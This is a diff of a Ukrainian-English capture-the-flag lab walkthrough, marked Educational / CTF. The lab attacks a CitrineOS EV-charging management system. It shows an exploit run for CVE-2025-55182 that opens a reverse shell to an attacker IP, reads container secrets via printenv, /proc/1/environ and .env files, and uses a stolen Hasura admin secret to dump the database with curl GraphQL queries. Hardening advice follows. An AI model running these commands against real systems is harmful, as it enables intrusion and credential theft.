@@ -480,72 +480,154 @@ cd ~/CVE-2025-55182-exp
 python3 exp.py http://192.168.250.50:8080 --revshell 192.168.125.228 5555
 
 # Результат: reverse shell від CSMS контейнера
-# uid=65533(nogroup) gid=65533(nogroup) groups=65533(nogroup)
+$ id
+uid=65533(nogroup) gid=65533(nogroup) groups=65533(nogroup)
 ```
-
-**🏁 FLAG #7:** `FLAG{r34ct2sh3ll_csms_pwn3d}`
 
 ---
 
-#### Крок 4.3: Credential Extraction
-```bash
-# Читаємо environment variables контейнера
-cat /proc/1/environ | tr '\0' '\n'
+#### Крок 4.3: Environment Variables & FLAG #7
 
-# Результат (ключові змінні):
-HASURA_ADMIN_SECRET=CitrineOS!
-NEXTAUTH_SECRET=CitrineOS-NextAuth-Secret-Key-2024
-NEXT_PUBLIC_ADMIN_PASSWORD=Cyber_CitrineOS!
-NEXT_PUBLIC_ADMIN_EMAIL=admin@citrineos.com
-POSTGRES_PASSWORD=citrine_db_password
-NODE_ENV=production
+**Мета:** Витягнути чутливі дані з середовища контейнера
+```bash
+# Спосіб 1: через printenv
+$ printenv
+
+# Спосіб 2: через /proc/1/environ (повний список процесу PID 1)
+$ cat /proc/1/environ | tr '\0' '\n'
+
+# Спосіб 3: через .env файл додатку
+$ find / -name ".env" 2>/dev/null
+$ cat /app/.env
 ```
 
-**🏁 FLAG #8:** `FLAG{h4sur4_s3cr3t_l34k3d}`
+**Результат — ключові змінні середовища:**
+```
+NODE_ENV=production
+HOSTNAME=citrineOS-csms
+PORT=3000
+NEXTAUTH_SECRET=CitrineOS-NextAuth-Secret-Key-2024
+NEXT_PUBLIC_ADMIN_EMAIL=admin@citrineos.com
+NEXT_PUBLIC_ADMIN_PASSWORD=Cyber_CitrineOS!
+NEXT_PUBLIC_TENANT_ID=1
+HASURA_ADMIN_SECRET=CitrineOS!
+POSTGRES_PASSWORD=citrine_db_password
+DATABASE_URL=postgresql://citrine:citrine_db_password@postgres:5432/citrine
+
+# CTF Flag прихований в environment
+FLAG_RCE_SUCCESS=FLAG{csms_3nv_3xf1ltr4t3d}
+```
+
+**🏁 FLAG #7:** `FLAG{csms_3nv_3xf1ltr4t3d}`
 
 **Credentials Extracted:**
 | Credential | Value | Purpose |
 |------------|-------|---------|
 | HASURA_ADMIN_SECRET | `CitrineOS!` | Full GraphQL admin access |
 | POSTGRES_PASSWORD | `citrine_db_password` | Database access |
-| Admin Email | `admin@citrineos.com` | UI login |
-| Admin Password | `Cyber_CitrineOS!` | UI login |
+| Admin Email | `admin@citrineos.com` | CitrineOS UI login |
+| Admin Password | `Cyber_CitrineOS!` | CitrineOS UI login |
 
 ---
 
-#### Крок 4.4: Full Database Compromise via Hasura GraphQL
+#### Крок 4.4: Full Database Compromise via Hasura GraphQL & FLAG #8
+
+**Мета:** Використати HASURA_ADMIN_SECRET для повного доступу до БД через GraphQL API
+
+**Налаштування для роботи з Hasura (через SOCKS proxy або curl з Jump Host):**
 ```bash
-# Підключаємось до Hasura Console через браузер (SOCKS proxy активний):
-# http://192.168.250.50:8080/console  (проксює до 192.168.20.20:8090)
-# Або через curl:
-
-curl -X POST http://192.168.20.20:8090/v1/graphql \
-     -H "Content-Type: application/json" \
-     -H "X-Hasura-Admin-Secret: CitrineOS!" \
-     -d '{
-       "query": "query GetInfrastructure { ChargingStations { id isInline chargePointVendor chargePointModel firmwareVersion locationId tenantId } }"
-     }'
-
-# Транзакції
-curl -X POST http://192.168.20.20:8090/v1/graphql \
-     -H "Content-Type: application/json" \
-     -H "X-Hasura-Admin-Secret: CitrineOS!" \
-     -d '{
-       "query": "query { Transactions(limit: 10, order_by: {createdAt: desc}) { transactionId isActive totalKwh totalCost chargingState stoppedReason } }"
-     }'
-
-# RFID авторизації
-curl -X POST http://192.168.20.20:8090/v1/graphql \
-     -H "Content-Type: application/json" \
-     -H "X-Hasura-Admin-Secret: CitrineOS!" \
-     -d '{
-       "query": "query { Authorizations { idToken idTokenType status groupAuthorizationId } }"
-     }'
+# Hasura Console доступна через браузер (SOCKS proxy активний):
+# http://192.168.20.20:8090/console
+# Вкладка API → вводимо x-hasura-admin-secret: CitrineOS!
 ```
 
-**🏁 FLAG #9 (FINAL):** `FLAG{full_csms_c0mpr0m1s3}`
+**Крок 1 — Розвідка: отримати список всіх таблиць**
+
+```bash
+# Крок 1 — Переглянути всі доступні таблиці через introspection:
+curl -s -X POST http://192.168.20.20:8090/v1/graphql \
+  -H "Content-Type: application/json" \
+  -H "X-Hasura-Admin-Secret: CitrineOS!" \
+  -d '{"query": "query { __schema { queryType { fields { name } } } }"}' \
+  | python3 -m json.tool
+
+# Крок 2 — Прочитати таблицю з флагом:
+curl -s -X POST http://192.168.20.20:8090/v1/graphql \
+  -H "Content-Type: application/json" \
+  -H "X-Hasura-Admin-Secret: CitrineOS!" \
+  -d '{"query": "query { ctf_flags { id flag_name flag_value hint } }"}' \
+  | python3 -m json.tool
+
+# Або ж через API GraphQL
+query {
+  __schema {
+    queryType {
+      fields {
+        name
+      }
+    }
+  }
+}
+
+query {
+  ctf_flags {
+    id
+    flag_name
+    flag_value
+    hint
+  }
+}
+```
+**🏁 FLAG #8:** `FLAG{h4sur4_graphql_full_db_dump}`
 
 ---
+
+#### Крок 4.5: CitrineOS Admin Panel — Partner Data & FINAL FLAG
+
+**Мета:** Увійти в адмін панель CitrineOS та знайти фінальний флаг у чутливих даних партнерів
+```bash
+# Credentials отримані з environment variables (Крок 4.3):
+# Email:    admin@citrineos.com
+# Password: Cyber_CitrineOS!
+
+# URL через SOCKS proxy:
+# http://192.168.20.20:3000/login
+```
+
+**Кроки в UI:**
+
+1. Відкрити `http://192.168.20.20:3000/login` у браузері (SOCKS proxy активний)
+2. Ввести `admin@citrineos.com` / `Cyber_CitrineOS!` → **Sign In**
+3. Перейти до розділу **Settings** або **Administration**
+4. Знайти розділ **Partners** / **Tenants** / **Organizations**
+5. Відкрити запис партнера — у полі `description` або `notes` знаходиться фінальний флаг
+
+**Що бачить учасник у записі партнера:**
+```json
+"roles": [
+        {
+          "role": "CPO",
+          "partyId": "UAGOV",
+          "countryCode": "UA",
+          "businessDetails": {
+            "name": "Ministry of Energy of Ukraine",
+            "website": "https://moe.gov.ua/?access_token=FLAG{t3n4nt_p4rtn3r_0cp1_d4t4_3xf1ltr4t3d}"
+          },
+          "business_details": {
+            "name": "Ministry of Energy of Ukraine",
+            "website": "https://moe.gov.ua/?access_token=FLAG{t3n4nt_p4rtn3r_0cp1_d4t4_3xf1ltr4t3d}"
+          }
+        }
+      ],
+      "endpoints": [
+        {
+          "identifier": "versions",
+          "url": "https://grid.gov.ua/ocpi/versions"
+        }
+      ]
+```
+
+**🏁 FLAG #9 (FINAL):** `FLAG{full_csms_c0mpr0m1s3_p4rtn3r_d4t4}`
 
 ## 3. Attack Summary
 
@@ -602,9 +684,9 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 | 4 | `FLAG{4p1_1nf0_d1scl0sur3}` | API Gateway | Info Disclosure | ⭐⭐ Medium |
 | 5 | `FLAG{jump_h0st_p1v0t}` | Jump Host | SSH Pivot | ⭐⭐ Medium |
 | 6 | `FLAG{gr4f4n4_cl0tH4b_cr39s}` | Grafana | Default Credentials | ⭐ Easy |
-| 7 | `FLAG{r34ct2sh3ll_csms_pwn3d}` | CSMS | CVE-2025-55182 RCE | ⭐⭐⭐⭐ Very Hard |
-| 8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | CSMS | /proc/1/environ | ⭐⭐⭐ Hard |
-| 9 | `FLAG{full_csms_c0mpr0m1s3}` | CSMS Database | Hasura GraphQL | ⭐⭐⭐ Hard |
+| 7 | `FLAG{csms_3nv_3xf1ltr4t3d}` | CSMS container | printenv / .env після RCE | ⭐⭐⭐ Hard |
+| 8 | `FLAG{h4sur4_graphql_full_db_dump}` | PostgreSQL (ctf_flags table) | Hasura GraphQL dump | ⭐⭐⭐ Hard |
+| 9 | `FLAG{full_csms_c0mpr0m1s3_p4rtn3r_d4t4}` | CitrineOS Admin UI | Partner record в адмін панелі | ⭐⭐⭐⭐ Very Hard |
 
 ### 3.3 Required Skills
 
@@ -613,8 +695,9 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 - **Network Pivoting:** SSH Local Port Forwarding, SOCKS5 Dynamic Proxy
 - **API Security:** Information disclosure, authentication bypass
 - **Modern Framework Exploitation:** CVE-2025-55182 (Next.js RCE)
-- **GraphQL:** Query construction, admin secret exploitation
-- **Container Security:** Environment variable extraction via /proc
+- **GraphQL:** Schema introspection, full table dump, admin secret exploitation
+- **Container Security:** Environment variable extraction via printenv / /proc
+- **Web Application Access:** Admin panel navigation, sensitive data discovery
 
 ---
 
@@ -636,6 +719,7 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 - ✅ Rotate API keys and secrets regularly
 - ✅ Don't store SSH keys on web servers
 - ✅ Don't store credentials in `.env` files on production servers
+- ✅ Never store sensitive data in environment variables без шифрування
 
 ### 4.4 Network Security
 - ✅ Implement strict network segmentation (фаєрвол блокує External → DMZ/Internal)
@@ -648,6 +732,7 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 - ✅ Implement WAF rules for React Server Component attacks
 - ✅ Change Grafana default credentials
 - ✅ Restrict Hasura Console access; use strong unique HASURA_ADMIN_SECRET
+- ✅ Не зберігати чутливі дані (флаги партнерів, API ключі) у текстових полях БД
 
 ---
 
@@ -683,7 +768,8 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 
 | Version | Date | Changes |
 |---------|------|---------|
-| 4.2 | Feb 2025 | Фінальне узгодження: виправлені команди injection (%23 патерн), backup.js overwrite замість env injection, Kali IP 192.168.125.228, firewall v4.2 (+port 8080), SOCKS proxy варіант, FLAG #3 і #6 оновлено |
+| 4.3 | Feb 2025 | Переробка FLAG #7-9: FLAG #7 → env vars (printenv/.env), FLAG #8 → Hasura GraphQL dump таблиці ctf_flags (додано SQL міграцію), FLAG #9 → CitrineOS Admin UI / Partners (додано SQL для TenantInformation) |
+| 4.2 | Feb 2025 | Виправлені команди injection (%23 патерн), backup.js overwrite, Kali IP 192.168.125.228, firewall v4.2 (+port 8080), SOCKS proxy варіант |
 | 4.0 | Feb 2025 | Complete rewrite: CWE-78 initial access, CVE-2025-55182 for CSMS |
 | 3.0 | Jan 2025 | CVE-2025-55182 for initial access |
 | 2.0 | Dec 2024 | Added DMZ components |
@@ -691,6 +777,6 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 
 ---
 
-**Document Version:** 4.2  
+**Document Version:** 4.3  
 **Classification:** Educational / CTF  
 **Last Updated:** February 2025
